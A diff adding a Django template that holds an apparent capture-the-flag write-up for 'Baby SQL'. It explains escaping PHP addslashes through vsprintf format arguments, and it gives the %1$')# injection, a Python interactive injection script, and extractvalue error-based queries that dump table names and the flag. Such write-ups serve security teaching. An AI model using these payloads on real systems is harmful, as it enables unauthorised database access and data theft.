@@ -1,0 +1,152 @@
+{% extends 'writeapp/base.html' %}
+
+{% load static %}
+
+{% block content %}
+
+<div id="overlay" class="overlay"></div>
+<div class="container-fluid p-5">
+    <div class="row">
+        <div class="form-group col-md-12">
+          <h2 class="mb-5">Baby SQL</h2>
+          <p> <strong> Vulnerability: </strong> Exposed source code leading to SQLI on POST parameter</p>
+
+
+          <p class="mt-5">Landing page shows the php source code.</p>
+          <img src="{% static 'writeapp/img/bsql1.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">As seen on the code, the only thing this site does is executes query.</p>
+          <p>It takes userinput from POST parameter 'pass'  .</p>
+
+          <p class="mt-5 mb-5">The developer, tries to sanitize user input by the use of addslashes . </p>
+          <p>According to php documentation, it will put backslash on the following input</p>.
+
+<pre class="code">
+<code>
+  Definition and Usage
+
+  The addslashes() function returns a string with backslashes in front of predefined characters.
+  The predefined characters are:
+  • single quote (')
+  • double quote (")
+  • backslash (\)
+  • NULL
+</code>
+</pre>
+
+          <p class="mt-5 mb-5">Tested this via online compiler</p>
+          <img src="{% static 'writeapp/img/bsql2.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">We can't do the regular addition of ' as it will add backslash in it.</p>
+          <p>Further review of the code, we found that the query is using vsprintf.</p>
+          <img src="{% static 'writeapp/img/bsql3.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Checking the documentation/</p>
+          <p> <a href="https://www.php.net/manual/en/function.vsprintf.php">https://www.php.net/manual/en/function.vsprintf.php</a></p>
+          <img src="{% static 'writeapp/img/bsql4.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">It accepts an array of arguments and the use of multiple variables.</p>
+          <p>That is why on the php code,  the username field is hardcoded in the query as a formatted string that returns admin.</p>
+          <img src="{% static 'writeapp/img/bsql5.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Tested this in php , tried putting the test' on variable $pass and it proves the theory earlier that we can't put ' on the pass variable.</p>
+          <p>Also the use of vsprintf allows formatted strings.</p>
+          <img src="{% static 'writeapp/img/bsql6.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Now reading on the comments section of the php manual page. Found out that we can use assigned arguments.</p>
+          <p>For example  %1\$s  is = to the 1st argument and %2\$s is = 2nd argument.</p>
+          <img src="{% static 'writeapp/img/bsql7.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">If we pass an invalid arg  %1$ and add '  . It will omit   the invalid arg returning only the single quote    '  because of the addslash function. </p>
+
+          <p>To test:  </p>
+          <img src="{% static 'writeapp/img/bsql8.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">As expected , we have successfully escaped the addslashes . </p>
+          <p class="mb-5">Without the addslashes function , the code will break</p>
+          <img src="{% static 'writeapp/img/bsql9.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">Any special character after $ will be identified by vsprintf as invalid, not just backslash.</p>
+          <img src="{% static 'writeapp/img/bsql10.png' %}"  class="img-fluid" alt=""> <br><br><br>
+          <img src="{% static 'writeapp/img/bsql11.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">Tested now on burp:</p>
+          <img src="{% static 'writeapp/img/bsql12.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Now for the exploitation.</p>
+          <p>We must add  ) to complete the query for the password field then add # to ignore the rest of the query.  .</p>
+
+          <p class="mt-5 mb-5">Injection: <code>  %1$')#</code></p>
+          <p>So it will look like this:</p>
+          <p class="mt-5">SELECT * FROM users WHERE password=('')# </p>
+          <p class="mt-5">Checked the commands and  shows  no error</p>
+          <img src="{% static 'writeapp/img/bsql13.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5 mb-5">Check number of columns.</p>
+          <img src="{% static 'writeapp/img/bsql14.png' %}"  class="img-fluid" alt="">
+
+          <p class="mt-5">Created a python script to have interactive terminal.</p>
+          <p>We are going to do error-based injection.</p>
+
+<pre class="code">
+<code>
+  import requests
+  from requests.packages.urllib3.exceptions import InsecureRequestWarning
+  import cmd
+  import os
+
+  commands = []
+
+
+  class SQL(cmd.Cmd):
+      prompt = "> "
+      def screen_clear(self):
+          if os.name == 'posix':
+              _ = os.system('clear')
+          else:
+              _ = os.system
+
+      def default(self, line):
+          proxies = {'http': 'http://127.0.0.1:8080'}
+          url = ("http://134.209.16.184:30062")
+          inject = {"pass": "%1$')||{}#".format(line)}
+          result = requests.post (url, data=inject,proxies=proxies,verify=False)
+          print(result.text)
+          commands.append(line)
+          if line == "clear":
+                  self.screen_clear()
+
+
+  SQL().cmdloop()
+</code>
+</pre>
+
+<p class="mt-5">Check DB version.</p>
+<pre class="code">
+<code>
+> extractvalue(null,+concat(0x7e,+version()))
+XPATH syntax error: '~10.5.5-MariaDB'
+</code>
+</pre>
+<p class="mt-5">Find table names : </p>
+<pre class="code">
+<code>
+>extractvalue(null, concat(0x3a,(SELECT group_concat(TABLE_NAME SEPARATOR 0x3a) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = database())))
+XPATH syntax error: ':totally_not_a_flag:users'
+</code>
+</pre>
+<p class="mt-5 mb-5">Found 2 tables.   ':totally_not_a_flag:users'</p>
+<p class="mb-5">Extract data from table "totally_not_a_flag" to get the flag </p>
+<pre class="code">
+<code>
+>extractvalue(null, concat(0x3a,(select * from totally_not_a_flag)))
+XPATH syntax error: ':HTB{h0w_d1d_y0u_f1nd_m3?}'
+</code>
+</pre>
+
+        </div>
+    </div>
+</div>
+
+
+{% endblock %}
